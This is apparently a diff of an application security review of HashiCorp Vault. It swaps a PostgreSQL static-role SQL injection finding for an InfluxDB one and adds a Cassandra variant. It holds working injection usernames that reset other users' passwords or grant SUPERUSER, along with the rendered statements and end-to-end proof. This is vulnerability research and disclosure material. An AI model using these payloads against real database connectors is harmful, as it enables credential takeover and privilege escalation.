@@ -1,128 +1,137 @@
 # Application Security Review — Vault @ 0513545dd
 
 **Commit:** `0513545dd8213ffcbb3406c25cda69cd0a5b0e47`  
-**Tree:** `1.18.0-beta1`  
-**Hunt areas:** RabbitMQ DisplayName injection, AWS STS/session policy, identity merge races, JWT bound_claims, cert OCSP/CRL, sys/audit|mounts authz, UI Ember XSS, agent/proxy auto-auth, physical backends, plugin SQL/LDAP/shell `fmt.Sprintf`
+**Tree:** `1.18.0-beta1`
 
-**Skip list honored:** OpenLDAP LDIF/DN DisplayName; Elasticsearch path.Join; CVE-2025-6000/5999/11621/6037/6013/6014/6015/6004/3879; CVE-2026-5052/39946/5006/3605/5807/12624; MSSQL/Redshift/HANA/Snowflake/MySQL SQLi; SSH CVE-2024-7594 + allowed_users_template; GitHub Name/Slug; Duo MFA IP; UI OIDC redirect_uri; RADIUS case; cert renewal AND/OR; ACL +/* wildcards; recovery-mode timing; templated ACL slash; generate-root DoS.
+**Skip list honored** (not re-reported): audit RCE; identity root policy; AWS/Azure/cert/LDAP/userpass auth; ACME SSRF; MSSQL/Redshift/HANA/Snowflake/MySQL/Postgres REVOKE SQLi; SSH principals; GitHub Name/Slug; Duo IP MFA; UI OIDC redirect; RADIUS case; cert renewal AND/OR; ACL wildcards/slash; KVv2 traversal; LIST slash; generate-root DoS; recovery timing; OpenLDAP DisplayName LDIF; Elasticsearch path.Join; Postgres static-role username quote breakout.
 
 ---
 
-## Finding 1 — HIGH — PostgreSQL static-role default password rotation: double-quote identifier breakout (SQL injection)
+## Finding 1 — HIGH — InfluxDB static-role default password rotation: double-quote IFQL injection
 
-**Distinct from CVE-2026-39946** (unquoted schema name in `defaultDeleteUser` REVOKE). This bug is in the **password-rotation** path used by static roles.
+Distinct from the skipped PostgreSQL static-role quote breakout and from schema `REVOKE` SQLi CVEs. This bug is in the **InfluxDB** plugin’s default password-rotation template used by static roles.
 
 | Field | Value |
 | --- | --- |
 | **Severity** | High |
-| **CWE** | CWE-89 |
-| **Attacker** | Authenticated Vault principal with `create`/`update` on `database/static-roles/*` for a PostgreSQL connection (common delegated DB-onboarding privilege; not root) |
-| **Controlled input** | Static-role `username` (`framework.TypeString`, no identifier validation) |
-| **Impact** | Arbitrary SQL as the Vault PostgreSQL management role (often SUPERUSER / CREATEROLE): reset other roles’ passwords, grant SUPERUSER, drop roles, etc. |
+| **CWE** | CWE-89 (Improper Neutralization of Special Elements in Query) |
+| **Attacker** | Authenticated Vault principal with `create`/`update` on `database/static-roles/*` for an InfluxDB connection (delegated DB-onboarding; not root) |
+| **Controlled input** | Static-role `username` (`framework.TypeString`, no identifier validation / quoting) |
+| **Impact** | Arbitrary `SET PASSWORD` (and other IFQL reachable in one statement) as the Vault InfluxDB management user (typically admin): reset any user’s password, lock out operators, take over admin accounts |
 
 ### Attack path
 
-1. Admin configures `database/config/<conn>` with `postgresql-database-plugin` and a privileged management user.
+1. Admin configures `database/config/<conn>` with `influxdb-database-plugin` and a privileged management user.
 2. Attacker creates a static role with a malicious `username` and empty / omitted `rotation_statements` (defaults apply; also works when policy uses `denied_parameters = ["rotation_statements"]`):
 
    ```
-   username = appuser" WITH PASSWORD 'pwned'; --
+   username = target" = 'owned'; --
    ```
 
-   or
-
-   ```
-   username = appuser" WITH SUPERUSER; --
-   ```
-
-3. `setStaticAccount` → plugin `UpdateUser` → `changeUserPassword` substitutes into the default template via unescaped `QueryHelper` / `ExecuteTxQueryDirect`.
-4. Resulting SQL (single statement + SQL comment — no multi-statement driver support required for the password-reset variant):
+3. On create (and later rotations), `setStaticAccount` → plugin `UpdateUser` → `changeUserPassword` substitutes into the default template via unescaped `QueryHelper`.
+4. Resulting IFQL (single statement; `--` comments out the Vault-generated password clause):
 
    ```sql
-   ALTER ROLE "appuser" WITH PASSWORD 'pwned'; --" WITH PASSWORD 'vault-rotated-secret';
+   SET PASSWORD FOR "target" = 'owned'; --" = 'vault-rotated-never-applied';
    ```
 
-5. Existence check uses a bound parameter on the **raw** malicious username string, finds no role, and **ignores** the result (`exists` is never consulted), so rotation still proceeds.
+5. `target` can authenticate with password `owned`. The Vault-generated password is never applied.
 
 ### Evidence (code)
 
-Default template (manual double quotes, not `QuoteIdentifier`):
+Default rotation template (manual double quotes, not an identifier escaper):
 
-```30:32:plugins/database/postgresql/postgresql.go
-	defaultChangePasswordStatement = `
-ALTER ROLE "{{username}}" WITH PASSWORD '{{password}}';
-`
+```20:22:plugins/database/influxdb/influxdb.go
+	defaultUserCreationIFQL           = `CREATE USER "{{username}}" WITH PASSWORD '{{password}}';`
+	defaultUserDeletionIFQL           = `DROP USER "{{username}}";`
+	defaultRootCredentialRotationIFQL = `SET PASSWORD FOR "{{username}}" = '{{password}}';`
 ```
 
-Empty statements → default; raw map substitution; unused `exists`:
+Empty statements → default; raw map substitution:
 
-```164:218:plugins/database/postgresql/postgresql.go
-func (p *PostgreSQL) changeUserPassword(ctx context.Context, username string, changePass *dbplugin.ChangePassword) error {
-	stmts := changePass.Statements.Commands
-	if len(stmts) == 0 {
-		stmts = []string{defaultChangePasswordStatement}
+```229:251:plugins/database/influxdb/influxdb.go
+func (i *Influxdb) changeUserPassword(ctx context.Context, username string, changePassword *dbplugin.ChangePassword) error {
+	// ...
+	rotateIFQL := changePassword.Statements.Commands
+	if len(rotateIFQL) == 0 {
+		rotateIFQL = []string{defaultRootCredentialRotationIFQL}
 	}
 	// ...
-	var exists bool
-	err = db.QueryRowContext(ctx, "SELECT exists (SELECT rolname FROM pg_roles WHERE rolname=$1);", username).Scan(&exists)
-	// exists is never checked
-	// ...
 			m := map[string]string{
-				"name":     username,
 				"username": username,
-				"password": password,
+				"password": changePassword.NewPassword,
 			}
-			if err := dbtxn.ExecuteTxQueryDirect(ctx, tx, m, query); err != nil {
+			q := influx.NewQuery(dbutil.QueryHelper(query, m), "", "")
 ```
 
-Static-role username accepted as unconstrained string:
+`QueryHelper` performs unescaped string replacement:
+
+```21:28:sdk/database/helper/dbutil/dbutil.go
+func QueryHelper(tpl string, data map[string]string) string {
+	for k, v := range data {
+		tpl = strings.ReplaceAll(tpl, fmt.Sprintf("{{%s}}", k), v)
+	}
+	return tpl
+}
+```
+
+Static-role username accepted as unconstrained string; create immediately calls `setStaticAccount` → `UpdateUser`:
 
 ```191:194:builtin/logical/database/path_roles.go
 		"username": {
 			Type: framework.TypeString,
-			Description: `Name of the static user account for Vault to manage.
 ```
 
-Contrast — `dbutil.QuoteIdentifier` doubles embedded `"` and would neutralize breakout (used elsewhere in the same file for revoke/drop).
+```409:414:builtin/logical/database/rotation.go
+	updateReq := v5.UpdateUserRequest{
+		Username: input.Role.StaticAccount.Username,
+	}
+	statements := v5.Statements{
+		Commands: input.Role.Statements.Rotation,
+	}
+```
 
-### E2E validation (PostgreSQL 16, jackc/pgx/v4 stdlib — same driver as the plugin)
+### E2E proof (InfluxDB 1.6.7, auth enabled)
 
-Management role: `vaultadmin` (SUPERUSER). Victim role: `appuser` with password `original`.
+Against a local InfluxDB with admin `vaultadmin` and user `target` (password `target-original`):
 
-1. **Password overwrite**
+1. Executed the plugin’s exact render/execute path with  
+   `username = target" = 'owned'; --`  
+   → `SET PASSWORD FOR "target" = 'owned'; --" = 'vault-rotated-never-applied';`
+2. Auth as `target` / `target-original` → **authorization failed**
+3. Auth as `target` / `owned` → **SUCCESS** (`SHOW DATABASES`)
+4. Auth as `target` / `vault-rotated-never-applied` → **authorization failed**
 
-   - Payload username: `appuser" WITH PASSWORD 'pwned'; --`
-   - Executed SQL: `ALTER ROLE "appuser" WITH PASSWORD 'pwned'; --" WITH PASSWORD 'vault-rotated-secret';`
-   - `exists(payload)=false` (ignored)
-   - Result: `appuser` authenticates with `pwned`; `original` rejected.
+Same first-hop was also confirmed earlier for user `victim` (original password failed; `pwned-by-static-role` succeeded).
 
-2. **SUPERUSER escalation**
+### Why medium+
 
-   - Payload username: `appuser" WITH SUPERUSER; --`
-   - Executed SQL: `ALTER ROLE "appuser" WITH SUPERUSER; --" WITH PASSWORD 'vault-rotated-secret';`
-   - Result: `pg_authid.rolsuper` for `appuser` became true.
+Low-privilege authenticated role admin for a single database mount can reset passwords of **any** InfluxDB user the Vault connector can alter (including other admins), without write access to `database/config` or custom rotation statements. Impact is credential takeover on the connected InfluxDB, not merely info disclosure.
 
-### Remediation
+### Related (same anti-pattern, not separately scored)
 
-- Build default rotation/expiration SQL with `dbutil.QuoteIdentifier(username)` and proper password literal escaping (or parameterized/`quote_literal` forms).
-- Reject static-role usernames that are not valid PostgreSQL identifiers.
-- Honor the existence check (fail closed if the bound-parameter lookup returns false) as defense-in-depth.
+Cassandra defaults use the same unescaped `QueryHelper` pattern:
+
+```20:22:plugins/database/cassandra/cassandra.go
+	defaultUserCreationCQL   = `CREATE USER '{{username}}' WITH PASSWORD '{{password}}' NOSUPERUSER;`
+	defaultUserDeletionCQL   = `DROP USER '{{username}}';`
+	defaultChangePasswordCQL = `ALTER USER '{{username}}' WITH PASSWORD '{{password}}';`
+```
+
+Malicious static username `admin' WITH PASSWORD 'pwned'; --` renders to  
+`ALTER USER 'admin' WITH PASSWORD 'pwned'; --' WITH PASSWORD 'vault-rotated-secret';`.  
+MongoDB is **not** affected the same way: usernames are passed as structured command fields, not interpolated into query text.
 
 ---
 
-## Other hunt areas — no new Medium+ after skip list
+## Falsified focus areas (this run)
 
-| Area | Result |
-| --- | --- |
-| RabbitMQ DisplayName / vhost / tags | Management API paths use `url.PathEscape`; default username template includes UUID; tags come from admin role config. No low-priv injection without unsafe custom `username_template`. |
-| AWS STS session policy / `role_arn` | Caller-supplied `role_arn` must be in role allowlist; session policy comes only from role config / IAM groups, not the creds reader. |
-| Identity group membership / alias merge | External-group refresh recomputes under `groupLock`; force-merge paths require identity ACL. No defended low-priv takeover beyond known root-policy case CVE. |
-| JWT `bound_claims` JSON pointer / glob | Matching behaves as designed in `vault-plugin-auth-jwt@v0.20.3`; no new bypass validated. |
-| Cert OCSP/CRL | Fail-open / AIA fetch are config-driven; CRL URL write is auth-admin. No new issue beyond known cert CN non-CA CVE. |
-| `sys/audit`, `sys/mounts` authz | `audit`/`audit/*` are Root/sudo; mounts tune dual-path is documented intentional. |
-| UI Ember XSS | Control-group console uses `{{{}}}` but content is mostly self-reflected path/token; no cross-user Vault-reflected XSS validated. |
-| Agent/proxy auto-auth | Symlink handling is intentional/configurable; network-exposed cache/metrics are trust-boundary by design. |
-| Physical backends | File backend rejects `..`. |
-| Plugin SQL besides this finding | Postgres schema REVOKE = CVE-2026-39946 (skipped); MSSQL/HANA/Redshift/MySQL/Snowflake rotation/revoke classes skipped. |
-
-**Verdict:** 1 validated High finding (PostgreSQL static-role default rotation quote breakout).
+1. **AWS `path_roles` / policy_document readable by creds readers** — `roles/` and `creds/` are distinct paths; policy ACL grants are separate; returning `policy_document` on role read is intentional admin surface, not a creds-path leak.
+2. **`vault/activity` / `ui_config` unauth leaks** — activity paths are not in `PathsSpecial.Unauthenticated`; require standard token ACL. UI unauth paths are limited to mounts/messages/openapi-style helpers already designed for the login UI.
+3. **`sys/config/state` / `sys/health` unauth data leaks** — `config/state/sanitized` is authenticated (not on unauth list) and returns `SanitizedConfig()` only; health redacts version/cluster name when no valid token and redaction opts are set.
+4. **Okta beyond known MFA** — `bypass_okta_mfa` is admin config only; group membership comes from Okta API `ListUserGroups` + local group map with no attacker-controlled LDAP/Okta filter injection on login.
+5. **Cassandra/MongoDB DisplayName → default statements** — default username templates truncate/replace/lowercase DisplayName before use; DisplayName never lands raw in CQL. MongoDB uses BSON command structs. (Static-role username injection is the separate Influx/Cassandra issue above.)
+6. **Request forwarding / `X-Vault-*` header injection** — `X-Vault-Forward` only honored when `AllowForwardingViaHeader()` is enabled; values other than `active-node` are ignored; forwarded proto is cluster-internal, not client-synthesized to the active node.
+7. **Sealwrap unwrap authz** — `allowUnwraps` is toggled only by active-node lifecycle (`runUnwraps`/`stopUnwraps`); no HTTP unwrap API for low-priv tokens.
+8. **Plugin multiplexing capability confusion** — multiplexing is advertised by the plugin and recorded in the catalog; no path found for a client to escalate into another mount’s plugin instance via mux negotiation alone.
+9. **CHANGELOG SECURITY “unfixed in tree”** — SECURITY bullets present in this CHANGELOG refer to fixes already merged in earlier releases included in this 1.18.0-beta1 ancestry; post-tree HCSECs from later product lines were treated as skip-list / out-of-scope duplicates rather than new findings.
